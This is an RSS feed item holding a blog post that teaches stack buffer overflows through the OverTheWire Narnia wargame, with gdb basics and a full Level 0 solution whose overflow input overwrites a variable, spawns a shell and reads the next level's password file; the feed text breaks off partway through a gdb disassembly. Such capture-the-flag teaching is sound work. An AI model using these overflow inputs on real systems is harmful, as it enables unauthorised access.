<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>High Bytes by bt3gl</title><link>http://bt3gl.github.io/</link><description></description><atom:link href="http://bt3gl.github.io/feeds/all.rss.xml" rel="self"></atom:link><lastBuildDate>Mon, 06 Oct 2014 06:30:00 -0400</lastBuildDate><item><title>Smashing the Stack for Fun or WarGames - Narnia 0-4</title><link>http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html</link><description>&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/3N2pUBJ.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;One of my mentors, &lt;a href="https://twitter.com/OwariDa"&gt; &lt;strong&gt;Joel Eriksson&lt;/strong&gt;&lt;/a&gt;, suggested me the quintessential &lt;strong&gt;&lt;a href="http://overthewire.org/wargames"&gt;WarGames&lt;/a&gt;&lt;/strong&gt;, a collection of &lt;strong&gt;Security problems&lt;/strong&gt;, divided into 14 interesting titles. I have been playing the games since last week and they are awesome! To play the WarGames you SSH to their servers with a login that indicates your current level. The purpose of the game is to solve  the current level's challenge to find the password for the next level.&lt;/p&gt;
&lt;p&gt;Today I am talking about the first five levels of &lt;strong&gt;&lt;a href="http://overthewire.org/wargames/narnia"&gt;Narnia&lt;/a&gt;&lt;/strong&gt;, which is all about &lt;strong&gt;&lt;a href="http://en.wikipedia.org/wiki/Buffer_overflow"&gt;buffer overflow&lt;/a&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;a href="http://en.wikipedia.org/wiki/Bounds_checking"&gt;inputs with no bounds checking&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;You will see that this war is not so bad when you know your weapons.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;How Stack Exploitation Works: A Crash Course&lt;/h2&gt;
&lt;h3&gt;A Process' Virtual Memory&lt;/h3&gt;
&lt;p&gt;When a program starts a process, the OS kernel provides it a piece of &lt;a href="http://en.wikipedia.org/wiki/Computer_memory"&gt;physical memory&lt;/a&gt;. However, all that the process sees is the &lt;a href="http://en.wikipedia.org/wiki/Virtual_memory"&gt;virtual memory space&lt;/a&gt; and its size and starting address. Each time a process wants to read or write to physical memory, its request must be translated from a virtual memory address to a physical memory address.&lt;/p&gt;
&lt;p&gt;I like &lt;a href="http://www.dirac.org/linux/gdb/"&gt;Peter Jay Salzman&lt;/a&gt;'s picture showing the process' virtual memory in terms of its address.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/RYEpFEA.png" /&gt;&lt;/p&gt;
&lt;p&gt;The &lt;em&gt;text&lt;/em&gt; and &lt;em&gt;data&lt;/em&gt; segments are the places where the program puts the code and the static data (&lt;em&gt;e.g&lt;/em&gt;., global variables). This region is normally marked read-only and any attempt to write to it will result in a &lt;a href="http://en.wikipedia.org/wiki/Segmentation_fault"&gt;segmentation violation&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Notice that arguments and environment variables get a special place in the top of the Stack (higher address).&lt;/p&gt;
&lt;p&gt;Although the &lt;a href="http://en.wikipedia.org/wiki/Heap_(data_structure)"&gt;Heap&lt;/a&gt; can be also fun to play with, for the purpose of these games, we will concentrate in the &lt;strong&gt;Stack&lt;/strong&gt;. Remember, the &lt;a href="https://stackoverflow.com/questions/664744/what-is-the-direction-of-stack-growth-in-most-modern-systems"&gt;direction of which the Stack grows&lt;/a&gt; is system-dependent.&lt;/p&gt;
&lt;h3&gt;What's the Stack&lt;/h3&gt;
&lt;p&gt;A Stack is an &lt;em&gt;abstract data type&lt;/em&gt; that has the property that the last object placed will be the first object removed. This is also known as &lt;em&gt;last-in/first-out queue&lt;/em&gt; or &lt;em&gt;LIFO&lt;/em&gt;.Two of the most important operations in a Stack are &lt;em&gt;push&lt;/em&gt; and &lt;em&gt;pop&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;You can think of a stack of books: the only way to reach the book in the bottom (the first book that was pushed) is by popping every book on the top. To learn how to write a Stack in Python, take a look at my notes on &lt;a href="https://github.com/bt3gl/Python-and-Algorithms-and-Data-Structures/blob/master/book/book_second_edition.pdf"&gt;Python &amp;amp; Algorithms&lt;/a&gt;. I also made the source code available: &lt;a href="https://github.com/bt3gl/Python-and-Algorithms-and-Data-Structures/tree/master/src/abstract_structures/Stacks"&gt;here are some examples&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The memory Stack frame  is a collection of (stack) frames. Every time a process calls a function, it  alters the flow of control.  In this case, a new frame needs to be added and the Stack grows downward (lower memory address).&lt;/p&gt;
&lt;p&gt;If you think about it, a Stack is the perfect object for a process: the process can push a  function (its arguments, code, etc.) into the Stack, then, in the end, it pops everything, back to where it started.&lt;/p&gt;
&lt;h3&gt;Buffer Overflows in the Stack&lt;/h3&gt;
&lt;p&gt;Buffer overflows happen when we give a buffer more information than it is meant to hold.  For example, the &lt;strong&gt;standard C library&lt;/strong&gt; has several functions for copying or appending strings with no bounds checking: &lt;code&gt;strcat()&lt;/code&gt;, &lt;code&gt;strcpy()&lt;/code&gt;, &lt;code&gt;sprintf()&lt;/code&gt;, &lt;code&gt;vsprintf()&lt;/code&gt;, &lt;code&gt;gets()&lt;/code&gt;, and &lt;code&gt;scanf()&lt;/code&gt;. These functions can  easily overflow a buffer if there the input is not validated first.&lt;/p&gt;
&lt;p&gt;To  better understand this subject, I recommend the classic &lt;a href="http://insecure.org/stf/smashStack.html"&gt;Smashing the Stack for Fun or Profit&lt;/a&gt; from &lt;a href="http://en.wikipedia.org/wiki/Elias_Levy"&gt;Aleph One&lt;/a&gt; , which was published in 1996 in the &lt;a href="http://www.phrack.org/"&gt;Phrack magazine&lt;/a&gt; number 49.&lt;/p&gt;
&lt;h3&gt;Assembly and the  Stack Registers&lt;/h3&gt;
&lt;p&gt;Registers are the location of the data storage on the CPU. When the process enters the Stack,  a register called the &lt;strong&gt;Stack pointer&lt;/strong&gt; (esp) points to the top of the Stack (lowest memory address).  The bottom of the Stack (higher memory address) is at a fixed address (adjusted by the kernel at run time). The CPU will implement instructions to push onto and pop stuff of the Stack.&lt;/p&gt;
&lt;p&gt;In Assembly code this looks like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;pushl&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;ebp&lt;/span&gt;
&lt;span class="n"&gt;movl&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;ebp&lt;/span&gt;
&lt;span class="n"&gt;subl&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The two first lines are the prologue. In the first line of this code, the (old) &lt;strong&gt;frame pointer&lt;/strong&gt; (ebp) is pushed onto the Stack (so we have it for when we leave). Then, the current &lt;strong&gt;esp&lt;/strong&gt; is copied into &lt;strong&gt;ebp&lt;/strong&gt;, making it the new frame pointer. This is the base of the Stack frame.  In the last line, the space is allocated for the local variables, subtracting their size from esp (remember that memory can only be addressed in multiples of the word size, for example 4 bytes, or 32 bits).&lt;/p&gt;
&lt;p&gt;After this point, the Assembly code will show each operation step in the program. We will learn more about this  during the challenges. It's a good skill to understand the basics of Assembly, but this is outside the context of this review. Check out  this &lt;a href="http://www.drpaulcarter.com/pcasm/"&gt;nice Assembly guide&lt;/a&gt; if you need to.&lt;/p&gt;
&lt;p&gt;Ah, by  the way, you can look to the Assembly output in a C program by  using the flag &lt;code&gt;-S&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gcc -S -o example1.s example1.c
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Narnia's WarGame&lt;/h2&gt;
&lt;h3&gt;The Scenario&lt;/h3&gt;
&lt;p&gt;In each of Narnia's levels we are able to &lt;a href="http://www.thegeekstuff.com/2011/10/c-program-to-an-executable/"&gt;run a binary and read its C code&lt;/a&gt;. The objective is to figure out from the code what vulnerability can be used to allow us to read the password of the next level (located in a folder under &lt;code&gt;/etc&lt;/code&gt; in the server).&lt;/p&gt;
&lt;h3&gt;Your Weapons&lt;/h3&gt;
&lt;h4&gt;Memory and Exploits Representation&lt;/h4&gt;
&lt;p&gt;When it comes to memory addresses, it's fundamental to understand &lt;a href="http://en.wikipedia.org/wiki/Hexadecimal"&gt;hexadecimal representation&lt;/a&gt;. You can print an HEX into &lt;a href="http://en.wikipedia.org/wiki/ASCII"&gt;ASCII&lt;/a&gt; with Python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x41&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;A&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Remember that Narnia's severs are &lt;a href="http://en.wikipedia.org/wiki/X86"&gt;x86&lt;/a&gt;, so they have &lt;a href="http://en.wikipedia.org/wiki/Endianness"&gt;little-endian&lt;/a&gt; representation. This means that an address &lt;code&gt;0xffffd546&lt;/code&gt; is actually written as &lt;code&gt;\x46\xd5\xff\xff&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Most of the exploit we deliver in Narnia are in form of input strings. Python with the flag, &lt;code&gt;-c&lt;/code&gt;, is really handy to craft what we need:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*20&amp;#39;&lt;/span&gt;
AAAAAAAAAAAAAAAAAAAA
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Environment Variables&lt;/h4&gt;
&lt;p&gt;If you look to the picture above, you see that the system environment variables are available within the Stack. This can be useful to some exploits, where we can use these variables to import payloads.&lt;/p&gt;
&lt;p&gt;To define an environment variable we use &lt;code&gt;export&lt;/code&gt;. To print its value, you can use &lt;code&gt;echo&lt;/code&gt; or &lt;code&gt;env&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ EGG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0X41414141&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$EGG&lt;/span&gt;
0X41414141
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;export &lt;/span&gt;EGG
&lt;span class="nv"&gt;$ &lt;/span&gt;env | grep EGG
&lt;span class="nv"&gt;EGG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0X41414141
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To understand more about environments variables in exploits,  take a look into my &lt;a href="http://bt3gl.github.io/understanding-the-shellshock-vulnerability.html"&gt;Shellshock guide&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;Shell Commands&lt;/h4&gt;
&lt;p&gt;The shell commands that are useful for these problems are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;readelf&lt;/code&gt;:  Displays information about ELF files (the binaries). For example, a detail that will be important soon is the fact that, in Narnia, the &lt;em&gt;Stack is executable&lt;/em&gt;. This means that we can place shellcode within it. To check whether the Stack is executable see if the following output has  the flag &lt;strong&gt;E&lt;/strong&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia1@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;readelf -a narnia1 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xxd&lt;/code&gt;:    Creates  a hex dump of a given file or standard input.  It can also convert a hex dump back to its original binary form.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;whoami&lt;/code&gt;: Shows the current user, good to see whether the exploit worked!&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gdb&lt;/h3&gt;
&lt;p&gt;In most of the problems in Narnia, it's fundamental do understand how to debug the binary  with &lt;strong&gt;gdb&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;To learn more about gdb, you might want to check this &lt;a href="http://www.thegeekstuff.com/2010/03/debug-c-program-using-gdb/"&gt;very introductory guide&lt;/a&gt; or  this &lt;a href="http://www.dirac.org/linux/gdb/"&gt;comprehensive guide&lt;/a&gt;. However, in any problem in Narnia these steps are enough:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;To start a gdb instance: &lt;code&gt;gdb -q &amp;lt;EXECUTABLE&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;To get the Assembly code we use the &lt;code&gt;disassemble&lt;/code&gt; command. Constants are prefixed with a $ and registers with a %:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;disassembly&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;flavor&lt;/span&gt; &lt;span class="n"&gt;intel&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;disas&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ol&gt;
&lt;li&gt;To set breakpoints to the address to inspect, based on the values from the output above:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="o"&gt;+&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SOME&lt;/span&gt; &lt;span class="n"&gt;NUMBER&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;To run the program: &lt;code&gt;(gdb) r&lt;/code&gt;. We also can use &lt;code&gt;c&lt;/code&gt; to continue to run it after breakpoint.  We can  use &lt;code&gt;n&lt;/code&gt; for next program line. We can print things using &lt;code&gt;p&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To examine some memory address, we can use &lt;code&gt;(gdb) x/30xw A&lt;/code&gt;, where &lt;strong&gt;A&lt;/strong&gt; is the address (&lt;em&gt;e.g.&lt;/em&gt;, &lt;code&gt;`$esp&lt;/code&gt;) and 30 is the number of outputs we want to see (the repeat count).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To examine the Stack frame: &lt;code&gt;(gdb) i f&lt;/code&gt;. We can also look at the Stack by using &lt;code&gt;bt&lt;/code&gt; (backtrace).&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Level 0: Classic Stack Overflow to rewrite a Variable&lt;/h2&gt;
&lt;h3&gt;Step 1: Understanding the Problem&lt;/h3&gt;
&lt;p&gt;The first level starts with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;cat narnia0.c

&lt;span class="c"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

int main&lt;span class="o"&gt;(){&lt;/span&gt;
  long &lt;span class="nv"&gt;val&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x41414141;
  char buf&lt;span class="o"&gt;[&lt;/span&gt;20&lt;span class="o"&gt;]&lt;/span&gt;;

  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Here is your chance: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
  scanf&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;%24s&amp;quot;&lt;/span&gt;,&amp;amp;buf&lt;span class="o"&gt;)&lt;/span&gt;;

  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;buf: %s\n&amp;quot;&lt;/span&gt;,buf&lt;span class="o"&gt;)&lt;/span&gt;;
  &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;val: 0x%08x\n&amp;quot;&lt;/span&gt;,val&lt;span class="o"&gt;)&lt;/span&gt;;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;val&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;0xdeadbeef&lt;span class="o"&gt;)&lt;/span&gt;
    system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
  &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;printf&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WAY OFF!!!!\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;;
    &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;;
  &lt;span class="o"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;return &lt;/span&gt;0;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The program receives an input from the user and save it in a buffer variable of size 20. Then, it checks if the &lt;em&gt;val&lt;/em&gt; is equal to a different value of what it was declared:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since &lt;em&gt;val&lt;/em&gt; obviously didn't change anywhere in the program, nothing happens and the program exits normally.&lt;/p&gt;
&lt;p&gt;However, if somehow we could  change the value of &lt;em&gt;val&lt;/em&gt; to &lt;a href="http://en.wikipedia.org/wiki/Hexspeak"&gt;0xdeadbeef&lt;/a&gt;, the program will give us a privileged shell!&lt;/p&gt;
&lt;p&gt;Let's think about the memory Stack. Just like in a pile of books, the local variables are pushed in the order that they are created. In the case above, &lt;em&gt;val&lt;/em&gt; is pushed before &lt;em&gt;buf&lt;/em&gt;, so &lt;em&gt;val&lt;/em&gt; is in a higher memory address:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x41414141&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;What happens if the input is larger than 20 bytes? In this case, there is no  bounds checking and the input overflows the variable &lt;em&gt;buf&lt;/em&gt;, occupying the following space in the Stack: &lt;em&gt;val&lt;/em&gt;. This is a classical case of &lt;strong&gt;Stack Overflow&lt;/strong&gt;!&lt;/p&gt;
&lt;h3&gt;Step 2: Visualizing the Overflow&lt;/h3&gt;
&lt;p&gt;The plan is to overflow &lt;em&gt;buf&lt;/em&gt; with 20+4 bytes, so that the last four bytes  overwrites &lt;em&gt;val&lt;/em&gt; with &lt;code&gt;0xdeadbeef&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let's see how &lt;em&gt;val&lt;/em&gt; is filled when we overflow byte by byte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*24&amp;#39;&lt;/span&gt;
BBBBBBBBBBBBBBBBBBBBBBBB

narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*19&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; | ./narnia0
Correct val&lt;span class="s1"&gt;&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;
&lt;span class="s1"&gt;Here is your chance: buf: BBBBBBBBBBBBBBBBBBB&lt;/span&gt;
&lt;span class="s1"&gt;val: 0x41414141&lt;/span&gt;
&lt;span class="s1"&gt;WAY OFF!!!!&lt;/span&gt;


&lt;span class="s1"&gt;narnia0@melinda:/narnia$ (python -c &amp;#39;&lt;/span&gt;print &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt;*20&lt;span class="s1"&gt;&amp;#39;) | ./narnia0&lt;/span&gt;
&lt;span class="s1"&gt;Correct val&amp;#39;&lt;/span&gt;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBB
val: 0x41414100
WAY OFF!!!!

narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*21&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; | ./narnia0
Correct val&lt;span class="s1"&gt;&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;
&lt;span class="s1"&gt;Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBB&lt;/span&gt;
&lt;span class="s1"&gt;val: 0x41410042&lt;/span&gt;
&lt;span class="s1"&gt;WAY OFF!!!!&lt;/span&gt;

&lt;span class="s1"&gt;narnia0@melinda:/narnia$ (python -c &amp;#39;&lt;/span&gt;print &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt;*22&lt;span class="s1"&gt;&amp;#39;) | ./narnia0&lt;/span&gt;
&lt;span class="s1"&gt;Correct val&amp;#39;&lt;/span&gt;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBB
val: 0x41004242
WAY OFF!!!!

narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;B&amp;quot;*23&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; | ./narnia0
Correct val&lt;span class="s1"&gt;&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;
&lt;span class="s1"&gt;Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBB&lt;/span&gt;
&lt;span class="s1"&gt;val: 0x00424242&lt;/span&gt;
&lt;span class="s1"&gt;WAY OFF!!!!&lt;/span&gt;

&lt;span class="s1"&gt;narnia0@melinda:/narnia$ (python -c &amp;#39;&lt;/span&gt;print &lt;span class="s2"&gt;&amp;quot;B&amp;quot;&lt;/span&gt;*24&lt;span class="s1"&gt;&amp;#39;) | ./narnia0&lt;/span&gt;
&lt;span class="s1"&gt;Correct val&amp;#39;&lt;/span&gt;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBBB
val: 0x42424242
WAY OFF!!!!
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Step 3: Crafting the Exploit&lt;/h3&gt;
&lt;p&gt;Now we know that &lt;code&gt;val&lt;/code&gt; starts to overflow in the 20th byte. All we need to do is to add &lt;code&gt;deadbeef&lt;/code&gt; in the last four bytes.&lt;/p&gt;
&lt;p&gt;However, we need to write this in hexadecimal form:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*20 + &amp;quot;\xef\xbe\xad\xde&amp;quot;&amp;#39;&lt;/span&gt;
AAAAAAAAAAAAAAAAAAAAﾭ
narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*20 + &amp;quot;\xef\xbe\xad\xde&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; | ./narnia0 Correct val&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yay, the exploit worked!&lt;/p&gt;
&lt;h3&gt;Step 4: Getting Access to the Shell&lt;/h3&gt;
&lt;p&gt;We  were able to get access to our shell, but it closed too fast, when the program execution ended.&lt;/p&gt;
&lt;p&gt;We need to create a way to read the password before we loose the  control to the shell. A good way is pipelining some command that  waits for an input, such as &lt;code&gt;tail&lt;/code&gt; or &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It turns out that only &lt;code&gt;cat&lt;/code&gt; actually prints the output:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c&lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*20 + &amp;quot;\xef\xbe\xad\xde&amp;quot;&amp;#39;&lt;/span&gt;; cat&lt;span class="o"&gt;)&lt;/span&gt; | /narnia/narnia0
Correct val&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
cat /etc/narnia_pass/narnia1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Done! We have completed the 0th level!&lt;/p&gt;
&lt;h3&gt;Step 5: Debugging it!&lt;/h3&gt;
&lt;p&gt;Although this problem was easy enough so we didn't need to debug anything, it's a good call to understand the process while the challenge is easy:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;narnia0@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;gdb ./narnia0
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;set &lt;/span&gt;disassembly-flavor intel
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas main
Dump of assembler code &lt;span class="k"&gt;for function &lt;/span&gt;main:
   0x080484c4 &amp;lt;+0&amp;gt;: push   ebp
   0x080484c5 &amp;lt;+1&amp;gt;: mov    ebp,esp
   0x080484c7 &amp;lt;+3&amp;gt;: and    esp,0xfffffff0
